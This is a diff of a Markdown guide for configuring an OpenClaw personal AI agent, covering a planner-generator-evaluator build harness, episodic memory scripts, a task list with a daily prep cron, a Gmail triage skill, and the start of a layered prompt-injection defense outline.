-3. Extracts key claims and structured knowledge
-4. Pushes to 3 targets: Obsidian vault, `memory/ingested/`, and FAISS vector index
-
-```bash
-#!/usr/bin/env bash
-# brain-ingest — Extract structured knowledge from video/audio/articles
-# Usage:
-#   brain-ingest "https://youtube.com/watch?v=..."
-#   brain-ingest --vault silverleafe --category research "URL"
-
-set -euo pipefail
-
-WORKSPACE="/path/to/workspace"  # ← Change
-VECTOR_DIR="$WORKSPACE/tools/vector-memory"
-
-# Map your Obsidian vaults
-declare -A VAULTS=(
-  ["main"]="/path/to/your/obsidian/vault"  # ← Change
-)
-
-VAULT_KEY="main"
-CATEGORY="research"
-INPUT=""
-
-while [[ $# -gt 0 ]]; do
-  case "$1" in
-    --vault) VAULT_KEY="$2"; shift 2 ;;
-    --category) CATEGORY="$2"; shift 2 ;;
-    *) INPUT="$1"; shift ;;
-  esac
-done
-
-VAULT_PATH="${VAULTS[$VAULT_KEY]}"
-
-# Step 1: Download/transcribe (use yt-dlp + whisper for video, or web_fetch for articles)
-# Step 2: Extract claims via LLM
-# Step 3: Write to Obsidian vault
-# Step 4: Write to memory/ingested/
-# Step 5: Reindex vector memory
-
-echo "brain-ingest: Processing $INPUT → $VAULT_PATH/$CATEGORY/"
-# ... implement based on your content types
-```
-
-### 9.2 Skill File — `skills/brain-ingest/SKILL.md`
-
-Create a skill file so the agent knows how to use brain-ingest in conversation:
-
-```markdown
-# brain-ingest Skill
-
-## When to Use
-When the user shares a URL (YouTube, article, podcast) and wants it captured in their knowledge base.
-
-## Usage
-bash tools/brain-ingest/brain-ingest.sh "URL"
-
-## Options
-- `--vault [name]` — target Obsidian vault
-- `--category [name]` — subfolder in vault
-
-## Output
-- Obsidian note with frontmatter, key claims, and summary
-- Copy in memory/ingested/
-- Auto-reindexed in vector memory
-```
-
----
-
-## Phase 10: Heartbeat System
-
-Heartbeats are periodic check-ins (default every 30 min). Instead of just replying "HEARTBEAT_OK", make them productive.
-
-### 10.1 HEARTBEAT.md
-
-```markdown
-# HEARTBEAT.md
-
-## Vector Memory Maintenance
-- If memory files were updated since last check, run vector memory reindex
-- Track in memory/heartbeat-state.json under "lastVectorReindex"
-
-## Daily Memory Log Stub
-- After 10pm, check if memory/YYYY-MM-DD.md exists for today
-- If not, run: bash tools/ensure-daily-log.sh
-- Also backfill yesterday if missing
-
-## Decision Review Check
-- Weekly, scan decisions/*.md for any past review_date
-- If a decision's review_date has passed, flag it for user review
-
-## Daily Summary
-- Once per day, between 9pm-midnight, write today's summary to:
-  shared-context/agent-outputs/general/YYYY-MM-DD-daily-summary.md
-```
-
-### 10.2 heartbeat-state.json
-
-Track what's been checked to avoid redundant work:
-
-```json
-{
-  "lastChecks": {},
-  "lastVectorReindex": 0,
-  "lastDailySummary": 0,
-  "lastDailyLogCheck": 0,
-  "lastDecisionReview": 0
-}
-```
-
----
-
-## Phase 11: Custom Skills
+## Phase 10: Custom Skills
 
 Skills are instruction files that teach your agent specific capabilities. Create them in a `skills/` directory.
 
@@ -1097,103 +1433,13 @@ Skills are in the skills/ directory. When you need one, read its SKILL.md.
 
 ---
 
-## Summary: Build Harness Skill Files
-
-| Skill | Path | Purpose |
-|-------|------|---------|
-| evaluator | `skills/evaluator/SKILL.md` | Skeptical critic with 4 criteria, browser testing, anti-leniency |
-| build-harness | `skills/build-harness/SKILL.md` | 3-agent orchestration: planner → generator → evaluator |
-| jonyive | `skills/jonyive/SKILL.md` | Design principles mapped to evaluator criteria |
-
-## Summary: Full Cron Schedule
-
-| Job | Schedule | Model | Purpose |
-|-----|----------|-------|---------|
-| hourly-memory-summarizer | :55 every hour | Sonnet | Keep context fresh |
-| vector-memory-reindex | Every 4h | Sonnet | Rebuild semantic search |
-| morning-brief | 7 AM daily | Sonnet | Daily briefing |
-| forge-daily-review | 6:30 AM daily | Sonnet | Ops audit |
-| daily-roundtable | 9 PM daily | Sonnet | Cross-agent synthesis |
-| forge-weekly-synthesis | Sunday 9 PM | Sonnet | Weekly rollup |
-| weekly-memory-compound | Sunday 10 PM | Sonnet | Weekly distillation |
-
-## Summary: File Map
-
-```
-workspace/
-├── AGENTS.md              # Boot sequence
-├── SOUL.md                # Agent identity
-├── USER.md                # Human profile
-├── MEMORY.md              # Long-term memory index
-├── CONTEXT_INJECTION.md   # Auto-generated recent context
-├── HEARTBEAT.md           # Heartbeat checklist
-├── active-tasks.md        # Crash recovery
-├── memory/
-│   ├── YYYY-MM-DD.md      # Daily logs
-│   ├── hourly/            # Hourly summaries
-│   ├── weekly/            # Weekly distillations
-│   ├── ingested/          # Brain-ingest outputs
-│   ├── retros/            # Engineering retrospectives
-│   ├── trace-analysis/    # Forge reports + pattern database
-│   ├── user-profile.md    # User details
-│   ├── infrastructure.md  # Tools & infra notes
-│   ├── projects.md        # Active projects
-│   └── lessons-learned.md # Hard-won lessons
-├── shared-context/
-│   ├── priorities.md      # Priority stack
-│   ├── agent-outputs/     # Per-agent output dirs
-│   ├── feedback/          # Structured feedback
-│   ├── roundtable/        # Cross-agent synthesis
-│   ├── kpis/              # Metrics
-│   └── calendar/          # Events
-├── tools/
-│   ├── vector-memory/     # FAISS semantic search
-│   ├── brain-ingest/      # URL → knowledge pipeline
-│   ├── forge/             # Monitoring agent prompts
-│   ├── hourly-summarizer.py
-│   ├── context-injector.py
-│   ├── weekly-compound.py
-│   ├── roundtable.py
-│   ├── feedback-logger.py
-│   └── ensure-daily-log.sh
-├── skills/                # Custom skills (SKILL.md each)
-│   ├── evaluator/         # GAN-style skeptical evaluator
-│   ├── build-harness/     # 3-agent build orchestration
-│   └── [other skills]/
-├── .harness/              # Build harness working directory (per-project)
-│   ├── spec.md            # Planner output
-│   ├── design-language.md # Visual direction
-│   ├── contracts/         # Sprint contract negotiations
-│   ├── evaluations/       # Evaluator scores + feedback
-│   └── harness-log.md     # Running log
-└── decisions/             # Documented decisions with review dates
-```
-
----
-
-## Cost Expectations
-
-With all crons running on Sonnet and direct chat on Opus:
-- **Hourly summarizer:** ~$0.01/run × 24 = ~$0.24/day
-- **Vector reindex:** Free (local Python)
-- **Roundtable:** ~$0.02/run = ~$0.02/day
-- **Forge daily:** ~$0.05/run = ~$0.05/day
-- **Morning brief:** ~$0.10/run = ~$0.10/day
-- **Weekly crons:** ~$0.15/week
-- **Heartbeats (Sonnet, every 30min):** ~$0.005/run × 48 = ~$0.24/day
-- **Total background cost: ~$0.65/day or ~$20/month**
-
-Direct conversations (Opus) are additional, based on usage.
-
----
-
-## Phase 12: GAN-Inspired Build Harness (Planner → Generator → Evaluator)
+## Phase 11: GAN-Inspired Build Harness (Planner → Generator → Evaluator)
 
 Single-agent builds have a ceiling. The agent builds something, evaluates its own work, praises it, and ships broken code. This phase adds a multi-agent architecture inspired by [Anthropic's harness research](https://www.anthropic.com/engineering/harness-design-long-running-apps) that separates building from judging — the same insight behind Generative Adversarial Networks.
 
 **The core problem:** LLMs are terrible at evaluating their own work. They find bugs, then talk themselves into deciding they're not a big deal. They approve stubbed features. They call mediocre design "clean and modern." Separating the builder from the critic is the single biggest quality lever.
 
-### 12.1 Architecture
+### 11.1 Architecture
 
 ```
 ┌─────────┐     spec.md      ┌───────────┐    eval-request.md    ┌───────────┐
@@ -1212,7 +1458,7 @@ Three agents, three roles:
 
 All communication happens via files in a `.harness/` directory. One agent writes, another reads. Simple, debuggable, crash-recoverable.
 
-### 12.2 The Evaluator — Calibrated Skepticism
+### 11.2 The Evaluator — Calibrated Skepticism
 
 The evaluator scores against 4 weighted criteria:
 
@@ -1223,7 +1469,7 @@ The evaluator scores against 4 weighted criteria:
 | Craft | 20% | 6/10 | Font scale, spacing base unit, WCAG contrast, hover/focus states |
 | Functionality | 25% | 7/10 | Every button works (not just logs), forms submit, data persists |
 
-**Overall pass:** ALL criteria meet minimum AND weighted average ≥ 6.0.
+**Overall pass:** ALL criteria meet minimum AND weighted average >= 6.0.
 
 The evaluator uses the browser (Playwright) to interact with the live app — it doesn't just read code. It clicks every button, fills every form, checks console after each action, and tests edge cases (empty states, overflow, mobile viewport at 375px).
 
@@ -1242,7 +1488,7 @@ These are baked into the evaluator's prompt to fight the natural tendency toward
 These patterns auto-deduct 3 points from the Originality score:
 
 - Purple/violet/indigo gradient backgrounds
-- The 3-column feature grid (icon-in-circle + bold title + 2-line description × 3)
+- The 3-column feature grid (icon-in-circle + bold title + 2-line description x 3)
 - Icons in colored circles as decoration
 - Everything center-aligned
 - Uniform bubbly border-radius on all elements
@@ -1262,7 +1508,7 @@ Out of the box, an LLM evaluator is too generous. Calibrate with few-shot exampl
 
 Include 3-5 such examples in the evaluator's prompt covering lenient, calibrated, and over-harsh behaviors.
 
-### 12.3 The Planner — $0.50 That Saves Hours
+### 11.3 The Planner — $0.50 That Saves Hours
 
 The planner takes a short prompt and produces a full product spec. This is the highest-ROI component — 5 minutes and $0.50 of planning prevents hours of building the wrong thing.
 
@@ -1277,7 +1523,7 @@ Output: `.harness/spec.md` (product spec) + `.harness/design-language.md` (visua
 
 **Critical:** Present the spec to the human for review before building. This is the checkpoint.
 
-### 12.4 Sprint Contracts
+### 11.4 Sprint Contracts
 
 Before each chunk of work, the generator and evaluator negotiate what "done" looks like:
 
@@ -1292,7 +1538,7 @@ Before each chunk of work, the generator and evaluator negotiate what "done" loo
 
 This prevents the generator from building the wrong thing or stubbing features. The contract is what the evaluator scores against — not vibes, not the spec's vague user stories.
 
-### 12.5 Sprint vs Continuous Mode
+### 11.5 Sprint vs Continuous Mode
 
 **Sprint Mode** (for Sonnet-class models or complex builds):
 - Decompose spec into 5-15 sprints
@@ -1309,7 +1555,7 @@ This prevents the generator from building the wrong thing or stubbing features. 
 
 *Note:* Anthropic found that context resets (full clean slate + structured handoff) outperform compaction for Sonnet-class models, which exhibit "context anxiety" — prematurely wrapping up as the context window fills. Opus 4.6 handles long context natively, making continuous mode viable.
 
-### 12.6 File-Based Communication
+### 11.6 File-Based Communication
 
 All inter-agent communication happens via files:
 
@@ -1334,7 +1580,7 @@ Why files instead of function calls or chat:
 - **Crash-recoverable:** If an agent dies, the files survive for the next session
 - **Auditable:** Full paper trail of every decision and score
 
-### 12.7 Implementation Options
+### 11.7 Implementation Options
 
 #### Option A: Manual Orchestration (Main Session)
 
@@ -1409,7 +1655,7 @@ Each agent gets personality files (`AGENTS.md`, `SOUL.md`) that encode their rol
 
 > "You are the person who finds the thing everyone else missed. You're not mean — you're honest. There's a difference. When you see a beautiful landing page, you appreciate it. Then you click the signup button and check if it actually works."
 
-### 12.8 The Numbers
+### 11.8 The Numbers
 
 From Anthropic's benchmarks:
 
@@ -1421,7 +1667,7 @@ From Anthropic's benchmarks:
 
 The harness is 10-20x more expensive. The output is categorically different — not incrementally better, but the difference between "core feature doesn't work" and "everything works, and it looks good."
 
-### 12.9 The Key Principle
+### 11.9 The Key Principle
 
 > "Every component in a harness encodes an assumption about what the model can't do on its own. Those assumptions are worth stress testing, both because they may be incorrect, and because they can quickly go stale as models improve."
 
@@ -1437,9 +1683,9 @@ Create these skills in your `skills/` directory:
 
 ---
 
-## Phase 13: Agentic Memory Architecture
+## Phase 12: Agentic Memory Architecture
 
-Phases 1–12 gave your agent memory. This phase makes it *intelligent* memory.
+Phases 1–11 gave your agent memory. This phase makes it *intelligent* memory.
 
 Inspired by research on agentic memory systems (Park et al. *Generative Agents*, 2023), this phase upgrades your memory from simple storage to a curated, self-improving knowledge system with four layers: in-context, external, episodic, and semantic. The result: your agent stops re-learning old lessons, recalls *how* it solved similar problems, and automatically prunes stale context.
 
@@ -1452,9 +1698,9 @@ Inspired by research on agentic memory systems (Park et al. *Generative Agents*,
 | Episodic | Task outcomes, approaches, lessons | memory/episodes/ (NEW) |
 | Semantic | World knowledge | Model weights (parametric) — supplemented by web search |
 
-Phases 1–4 built the first two layers. Phase 13 adds episodic memory with importance scoring, decay-weighted recall, and automated consolidation — turning your flat file memory into a self-curating knowledge system.
+Phases 1–3 built the first two layers. Phase 12 adds episodic memory with importance scoring, decay-weighted recall, and automated consolidation — turning your flat file memory into a self-curating knowledge system.
 
-### 13.1 Episodic Memory System
+### 12.1 Episodic Memory System
 
 Episodic memory records *what happened, what worked, and what didn't* — structured task outcomes your agent can recall next time it faces something similar.
 
@@ -1498,7 +1744,7 @@ Field reference:
 | `approach` | Yes | Step-by-step what was tried |
 | `outcome` | Yes | `success`, `partial`, `failure` |
 | `lesson` | Yes | The takeaway — what future-you should know |
-| `importance` | Yes | 1-10 score (see §13.2) |
+| `importance` | Yes | 1-10 score (see section 12.2) |
 | `related_files` | No | Links to daily notes, decisions, etc. |
 | `decay_anchor` | Yes | Timestamp for recency scoring |
 
@@ -1550,7 +1796,7 @@ cat > "$EPISODE_DIR/$ID.json" << EOF
 }
 EOF
 
-echo "✅ Episode logged: $EPISODE_DIR/$ID.json"
+echo "Episode logged: $EPISODE_DIR/$ID.json"
 ```
 
 In practice, the agent creates episodes directly by writing JSON. The script is for manual logging or cron-based extraction.
@@ -1566,7 +1812,7 @@ After completing any significant task (debugging, feature build, research, key d
 
 1. Write an episode file to `memory/episodes/ep-YYYY-MM-DD-short-desc.json`
 2. Follow the episode schema (see tools/episodes/README.md)
-3. Score importance honestly (see §13.2 heuristic)
+3. Score importance honestly (see section 12.2 heuristic)
 4. Include the actual lesson — not a platitude
 
 Bad lesson: "Always test before deploying"
@@ -1595,7 +1841,7 @@ def load_episodes(episode_dir):
             with open(f) as fh:
                 episodes.append(json.load(fh))
         except (json.JSONDecodeError, KeyError) as e:
-            print(f"⚠️  Skipping {f}: {e}", file=sys.stderr)
+            print(f"Skipping {f}: {e}", file=sys.stderr)
     return episodes
 
 def text_relevance(query, episode):
@@ -1619,14 +1865,14 @@ def recency_score(episode, half_life_days=30):
     if dt.tzinfo is None:
         dt = dt.replace(tzinfo=timezone.utc)
     age_days = (now - dt).total_seconds() / 86400
-    return math.exp(-0.693 * age_days / half_life_days)  # ln(2) ≈ 0.693
+    return math.exp(-0.693 * age_days / half_life_days)  # ln(2) = 0.693
 
 def importance_score(episode):
     """Normalize importance to 0-1 range."""
     return min(max(episode.get('importance', 5), 1), 10) / 10.0
 
 def weighted_score(query, episode):
-    """Combined score: relevance × 0.4 + importance × 0.3 + recency × 0.3"""
+    """Combined score: relevance x 0.4 + importance x 0.3 + recency x 0.3"""
     rel = text_relevance(query, episode)
     imp = importance_score(episode)
     rec = recency_score(episode)
@@ -1654,7 +1900,7 @@ if __name__ == '__main__':
 
     for ep, score in results:
         print(f"\n{'='*60}")
-        print(f"📎 {ep['title']} (score: {score:.2f}, importance: {ep['importance']}/10)")
+        print(f"{ep['title']} (score: {score:.2f}, importance: {ep['importance']}/10)")
         print(f"   Type: {ep['task_type']} | Outcome: {ep['outcome']}")
         print(f"   Context: {ep['context'][:200]}")
         print(f"   Lesson: {ep['lesson']}")
@@ -1691,21 +1937,21 @@ for f in "$EPISODE_DIR"/*.json; do
   echo "" >> "$INDEX_FILE"
 done
 
-echo "✅ Indexed $(ls "$EPISODE_DIR"/*.json 2>/dev/null | wc -l | tr -d ' ') episodes → $INDEX_FILE"
+echo "Indexed $(ls "$EPISODE_DIR"/*.json 2>/dev/null | wc -l | tr -d ' ') episodes → $INDEX_FILE"
 
 # Now re-index with QMD
 qmd index memory/episodes/
 ```
 
-Run this after logging episodes, or wire it into a cron job (see §13.5).
+Run this after logging episodes, or wire it into a cron job (see section 12.5).
 
-### 13.2 Importance Scoring
+### 12.2 Importance Scoring
 
 Not every task deserves an episode. Importance scoring acts as a **write gate** — filtering noise before it enters your episodic memory.
 
 #### The Heuristic Scorer
 
-Importance is scored 1–10 based on five signals:
+Importance is scored 1-10 based on five signals:
 
 | Signal | Weight | Description |
 |--------|--------|-------------|
@@ -1719,11 +1965,11 @@ Importance is scored 1–10 based on five signals:
 
 | Task | Nov | Imp | Reu | Dif | Sur | Total | Log? |
 |------|-----|-----|-----|-----|-----|-------|------|
-| Fixed nginx config after upgrade | 2 | 2 | 2 | 1 | 1 | **8** | ✅ |
-| Changed button color per request | 0 | 0 | 0 | 0 | 0 | **0** | ❌ |
-| Discovered QMD timeout causes silent failures | 2 | 3 | 2 | 2 | 1 | **10** | ✅ |
-| Routine daily summary | 0 | 1 | 0 | 0 | 0 | **1** | ❌ |
-| New cron pattern for batch processing | 1 | 2 | 2 | 1 | 0 | **6** | ✅ |
+| Fixed nginx config after upgrade | 2 | 2 | 2 | 1 | 1 | **8** | Yes |
+| Changed button color per request | 0 | 0 | 0 | 0 | 0 | **0** | No |
+| Discovered QMD timeout causes silent failures | 2 | 3 | 2 | 2 | 1 | **10** | Yes |
+| Routine daily summary | 0 | 1 | 0 | 0 | 0 | **1** | No |
+| New cron pattern for batch processing | 1 | 2 | 2 | 1 | 0 | **6** | Yes |
 
 #### Write Gate
 
@@ -1741,31 +1987,31 @@ Before logging an episode, score importance using the 5-signal heuristic:
 
 This keeps your episode store lean. After a month of active use, you should have 30-60 episodes, not 300. Quality over quantity.
 
-### 13.3 Decay-Weighted Recall
+### 12.3 Decay-Weighted Recall
 
 Raw keyword search returns episodes by relevance alone. But a perfectly relevant episode from 6 months ago about a since-deprecated API is noise. Decay-weighted recall balances three signals:
 
 #### The Scoring Formula
 
 ```
-final_score = (relevance × 0.4) + (importance × 0.3) + (recency × 0.3)
+final_score = (relevance x 0.4) + (importance x 0.3) + (recency x 0.3)
 ```
 
 Where:
-- **Relevance (0–1):** Keyword overlap or vector cosine similarity between query and episode text
-- **Importance (0–1):** Episode importance score normalized (divide by 10)
-- **Recency (0–1):** Exponential decay with configurable half-life
+- **Relevance (0-1):** Keyword overlap or vector cosine similarity between query and episode text
+- **Importance (0-1):** Episode importance score normalized (divide by 10)
+- **Recency (0-1):** Exponential decay with configurable half-life
 
 ```
-recency = e^(-0.693 × age_days / half_life_days)
+recency = e^(-0.693 x age_days / half_life_days)
 ```
 
 With a 30-day half-life:
 - Today's episode: recency = 1.0
-- 1 week old: recency ≈ 0.85
+- 1 week old: recency = 0.85
 - 30 days old: recency = 0.5
-- 90 days old: recency ≈ 0.125
-- 180 days old: recency ≈ 0.016
+- 90 days old: recency = 0.125
+- 180 days old: recency = 0.016
 
 This means a 6-month-old episode needs to be *extremely* relevant and important to surface. Which is exactly what you want.
 
@@ -1816,7 +2062,7 @@ For the agent, add this to the AGENTS.md semantic recall step:
    b. `python3 tools/episodes/recall.py "TOPIC" --top 3` (NEW — episodic memory)
 ```
 
-### 13.4 Automated Consolidation
+### 12.4 Automated Consolidation
 
 Episodic memory grows. Without maintenance, it fills with duplicates, stale entries, and near-identical lessons. Consolidation keeps it sharp.
 
@@ -1938,7 +2184,7 @@ if __name__ == '__main__':
     actions = consolidate(args.episode_dir, args.archive_days, args.dry_run)
     
     if not actions:
-        print("✨ No consolidation needed.")
+        print("No consolidation needed.")
     else:
         prefix = "[DRY RUN] " if args.dry_run else ""
         for action in actions:
@@ -1948,7 +2194,7 @@ if __name__ == '__main__':
 
 #### Merge Strategy
 
-When two episodes have >60% combined similarity (lesson × 0.6 + context × 0.4):
+When two episodes have >60% combined similarity (lesson x 0.6 + context x 0.4):
 
 1. **Keep the higher-importance episode** as the base
 2. **Merge unique tags** from the duplicate
@@ -1963,9 +2209,9 @@ Episodes older than 180 days with importance < 6 get archived automatically. The
 - **Low-importance old episodes decay naturally** — routine fixes, temporary workarounds, context that's no longer relevant
 - **Archived episodes aren't deleted** — they're moved to `memory/episodes/archive/` and excluded from active recall, but still searchable if you need them
 
-### 13.5 Integration with Existing Systems
+### 12.5 Integration with Existing Systems
 
-Wire episodic memory into the systems you already have running from Phases 1–12.
+Wire episodic memory into the systems you already have running from Phases 1-11.
 
 #### AGENTS.md Updates
 
@@ -1978,7 +2224,7 @@ Add to your boot sequence (after the existing step 7):
 
 ### Episodic Memory
 
-After completing significant tasks (importance ≥ 5):
+After completing significant tasks (importance >= 5):
 - Write episode to `memory/episodes/ep-YYYY-MM-DD-short-desc.json`
 - Score importance honestly: Novelty(0-2) + Impact(0-3) + Reusability(0-2) + Difficulty(0-2) + Surprise(0-1)
 - Include specific, actionable lessons — not platitudes
@@ -2027,7 +2273,7 @@ openclaw cron add \
   --channel telegram
 ```
 
-#### Integration with Phase 3 (Hourly Summarizer)
+#### Integration with Phase 5 (Hourly Summarizer)
 
 Your hourly summarizer already scans recent activity. Add episode extraction to it:
 
@@ -2035,13 +2281,13 @@ Your hourly summarizer already scans recent activity. Add episode extraction to 
 # Add to your hourly summarizer prompt:
 
 After generating the hourly summary, check if any tasks in this hour
-qualify for episodic memory (importance ≥ 5). If so, generate the
+qualify for episodic memory (importance >= 5). If so, generate the
 episode JSON and write it to memory/episodes/.
 ```
 
 This creates a natural pipeline: work happens → hourly summarizer captures it → significant tasks get promoted to episodic memory → consolidation keeps the store clean.
 
-#### Integration with Phase 10 (Retros)
+#### Integration with Retros
 
 Retros are a natural source of high-importance episodes. After running a retro:
 
@@ -2049,15 +2295,15 @@ Retros are a natural source of high-importance episodes. After running a retro:
 # Add to your retro skill:
 
 After completing the retro, extract 1-3 top lessons and log them as
-episodes with importance ≥ 7. Retro-sourced episodes should have
+episodes with importance >= 7. Retro-sourced episodes should have
 task_type: "decision" and tag: "retro".
 ```
 
-### 13.6 Benefits Analysis
+### 12.6 Benefits Analysis
 
 Concrete improvements from implementing agentic memory:
 
-| Dimension | Before (Phases 1-12) | After (Phase 13) | Improvement |
+| Dimension | Before (Phases 1-11) | After (Phase 12) | Improvement |
 |-----------|---------------------|-------------------|-------------|
 | **Lesson retention** | Lessons in daily notes, rarely re-read | Structured episodes with active recall | Agent recalls *how* it solved similar problems |
 | **Context window efficiency** | All memory loaded equally | Importance + decay filtering | 40-60% reduction in irrelevant context |
@@ -2066,17 +2312,452 @@ Concrete improvements from implementing agentic memory:
 | **Decision quality** | Decisions based on current context only | Past outcomes inform new decisions | Compound learning across sessions |
 | **Noise ratio** | Every task noted equally in daily files | Write gate filters low-importance events | Episode store stays lean (30-60 active vs 300+ daily entries) |
 
-**The key shift:** Phases 1–12 gave your agent *storage*. Phase 13 gives it *judgment* about what to store, *intelligence* about what to recall, and *discipline* about what to forget.
+**The key shift:** Phases 1-11 gave your agent *storage*. Phase 12 gives it *judgment* about what to store, *intelligence* about what to recall, and *discipline* about what to forget.
 
 A well-tuned episodic memory system means your agent gets meaningfully better at its job over time — not just because the model improves, but because *your specific agent* accumulates experience that persists across sessions, models, and even platform upgrades.
 
 ---
 
-## Phase 14: Physical Mail Intake Pipeline *(Optional)*
+# Tier 5: Hardening & Integration
 
-> **This phase is optional.** It adds a physical-to-digital mail scanning and categorization system. If you don't need physical mail management, skip to the closing notes. Want this feature? Read on.
+---
 
-Most productivity systems stop at the digital boundary. But physical mail — bills, legal notices, insurance, tax documents — still arrives in paper form and creates its own backlog. This phase bridges the gap: a camera-based scanning system that ingests physical mail into your agent's workflow with automatic OCR categorization.
+## Phase 13: Canonical Tasks, Daily Prep & Email Sweep
+
+Inspired by Ryan Carson's clawchief system (4,800+ bookmarks) — the insight that transformed his OpenClaw from a reactive chatbot into a chief of staff: *"I didn't get the world's best assistant by asking better questions. I got it by giving it a better operating system."*
+
+This phase adds three things: a single source of truth for tasks, a cron that preps your day before you wake up, and an email triage system.
+
+### 13.1 Canonical Task List (`tasks/current.md`)
+
+Stop scattering tasks across daily logs, Obsidian, chat history, and your head. One file. Four sections.
+
+```markdown
+# Tasks — Single Source of Truth
+
+## Today
+- [ ] Review Exchange Building lease renewal
+- [ ] Test AIO calendar sync with Google Calendar
+- [ ] Reply to Murray Wells re: contractor walkthrough
+
+## This Week
+- [ ] VerdictAI: Define product scope with Arslan
+- [ ] Set up GOG for Gmail integration
+- [ ] Wire real Obsidian data into AIO production
+
+## Backlog
+- [ ] AIO: Pi camera mail automation
+- [ ] Building OS: Deploy and pilot with Exchange STR units
+- [ ] Marina: Slip pricing model
+
+## Done (Recent)
+- [x] AIO Dashboard — full build + deploy
+- [x] Memory architecture upgrade (Phases 10-12)
+- [x] Calendar sync (iCal, Google, file upload)
+```
+
+**Rules:**
+- Agent reads this file **every session** (add to AGENTS.md boot sequence)
+- Agent updates it as tasks complete, get added, or change priority
+- Items move: Backlog → This Week → Today → Done
+- When emails, messages, or meetings create action items → add to the appropriate section
+- Completed items (`[x]`) get archived weekly
+
+Add to your AGENTS.md:
+```markdown
+### Task Management — One Source of Truth
+`tasks/current.md` is THE task list. Read it at session start.
+Update it when tasks complete or new ones appear.
+Daily prep cron runs at 6am to promote due items and deduplicate.
+```
+
+### 13.2 Daily Task Prep Cron
+
+A script that runs before you wake up, so your day is ready when you check in.
+
+**`tools/daily-task-prep.sh`:**
+
+What it does:
+1. **Backs up** the task file daily to `tasks/archive/`
+2. **Scans Backlog** for items with dates that have arrived → promotes to Today
+3. **Deduplicates** repeated tasks across all sections
+4. **Archives** completed items weekly (Mondays) to `tasks/archive/done-week-of-YYYY-MM-DD.md`
+5. **Reports** summary: counts per section, promotions made, duplicates found
+
+```bash
+#!/usr/bin/env bash
+# daily-task-prep.sh — Run at 6am via cron
+set -euo pipefail
+WORKSPACE="${WORKSPACE:-$(pwd)}"
+TASK_FILE="$WORKSPACE/tasks/current.md"
+
+# Backup
+cp "$TASK_FILE" "$WORKSPACE/tasks/archive/current-$(date +%Y-%m-%d).md"
+
+# Promote due items (items in Backlog with dates <= today)
+# Deduplicate (find identical task text across sections)
+# Archive done items on Mondays
+# Report summary
+```
+
+Register the cron:
+```bash
+openclaw cron add \
+  --name "daily-task-prep" \
+  --cron "0 6 * * *" \
+  --tz "America/Chicago" \
+  --message "Run daily task prep: bash tools/daily-task-prep.sh. Read tasks/current.md. Promote due items to Today. Deduplicate. Notify via Telegram only if there are changes." \
+  --model "sonnet" \
+  --session "isolated" \
+  --light-context \
+  --timeout-seconds 60
+```
+
+Why Sonnet: this is mechanical work, doesn't need Opus. Saves ~80% on this cron.
+
+### 13.3 Email Sweep Skill
+
+The most requested "chief of staff" feature: proactive inbox triage.
+
+**Prerequisites:** GOG (Google OAuth Gateway) for Gmail access. Without GOG, this skill is dormant.
+
+**Create `skills/email-sweep/SKILL.md`:**
+
+The sweep runs every 15 minutes and does:
+
+1. **Search** for unread emails since last sweep
+2. **Score** each email by priority:
+   - **Urgent** — Known contacts, "urgent"/"asap", financial/legal, calendar invites → Telegram notification immediately
+   - **Important** — Known contacts, project-related, replies to active threads → included in sweep summary
+   - **Low** — Newsletters, marketing, automated notifications → skip
+   - **Ignore** — Spam, promotions, receipts → skip entirely
+3. **Detect follow-ups needed** — outbound emails >24h with no reply
+4. **Add action items** to `tasks/current.md` when emails require a response
+5. **Respect quiet hours** — 11pm-7am: urgent only. Weekends: 2 sweeps/day.
+
+**Contact priority list** (`tools/email-sweep/contacts.json`):
+```json
+{
+  "vip": ["important@person.com", "@familydomain.com"],
+  "projects": ["@exchange-building.com"],
+  "business": ["@company.com"]
+}
+```
+
+**Output format:**
+```
+Email Sweep — 3:15 PM
+
+URGENT (1):
+- From: Murray Wells — "Lease renewal deadline Friday"
+  → Action: Review and sign
+
+IMPORTANT (2):
+- From: Arslan — "VerdictAI product scope"
+- From: GitHub — PR review on sardoru/aio
+
+FOLLOW-UPS (1):
+- No reply from Contractor re: "Walkthrough scheduling" (2 days)
+
+Skipped: 12 newsletters, 3 promos
+```
+
+**Cron setup (activate after GOG):**
+```bash
+openclaw cron add \
+  --name "email-sweep" \
+  --every "15m" \
+  --tz "America/Chicago" \
+  --message "Run email sweep. Check Gmail for unread. Triage by priority. Notify only for urgent items or first sweep of the day." \
+  --model "sonnet" \
+  --session "isolated" \
+  --light-context \
+  --timeout-seconds 45
+```
+
+**State tracking** (`memory/email-sweep-state.json`):
+```json
+{
+  "lastSweep": "2026-04-03T19:45:00Z",
+  "urgentCount": 1,
+  "importantCount": 3,
+  "followUpsFound": 1
+}
+```
+
+### 13.4 Integration
+
+All three systems feed into each other:
+
+```
+Email Sweep (every 15m)
+  │
+  ├─ Urgent emails → Telegram notification
+  ├─ Action items → tasks/current.md ## Today
+  └─ Follow-ups → tasks/current.md ## Today
+
+Daily Task Prep (6am)
+  │
+  ├─ Promote due items → ## Today
+  ├─ Deduplicate across sections
+  ├─ Archive completed items (Mondays)
+  └─ Summary → Telegram (if changes)
+
+Agent Session (on demand)
+  │
+  ├─ Reads tasks/current.md at boot
+  ├─ Updates tasks as work is done
+  └─ Adds new tasks from conversations
+```
+
+### 13.5 Benefits Analysis
+
+| Before | After | Impact |
+|--------|-------|--------|
+| Tasks scattered across daily logs, Obsidian, chat | One canonical `tasks/current.md` | Never lose a task, always know what's on Today |
+| Morning starts with "what was I doing?" | Day is prepped at 6am with promoted items | Hit the ground running every morning |
+| Email checked manually, things fall through | 15-min sweep surfaces only what matters | Important emails never missed, junk never shown |
+| Follow-ups forgotten | Agent tracks unanswered outbound >24h | Relationships maintained, nothing drops |
+| Passive agent waits for instructions | Proactive agent manages your operational reality | Agent shifts from tool to chief of staff |
+
+**The key shift:** Phases 1-12 made your agent intelligent and self-improving. Phase 13 makes it *operationally proactive* — it doesn't wait for you to ask, it manages your day.
+
+---
+
+## Phase 14: Security Hardening
+
+Inspired by Matthew Berman's "Teaching OpenClaw to not get Hacked" (1,542 bookmarks). Your agent processes untrusted input from X articles, web pages, email, and chat — every one of those is a prompt injection surface. This phase adds a layered defense system plus a consent registry for sensitive operations.
+
+**The core principle:** No single check catches everything. Layers run cheapest first — most attacks die at Layer 1 (free, instant regex) and never reach Layer 2 (an LLM call).
+
+### 14.1 Architecture Overview
+
+```
+Untrusted input
+  → Layer 1: Text sanitization (pattern matching, Unicode cleanup)
+  → Layer 2: Frontier scanner (LLM-based risk scoring)
+  → Layer 3: Outbound content gate (catches leaks going out)
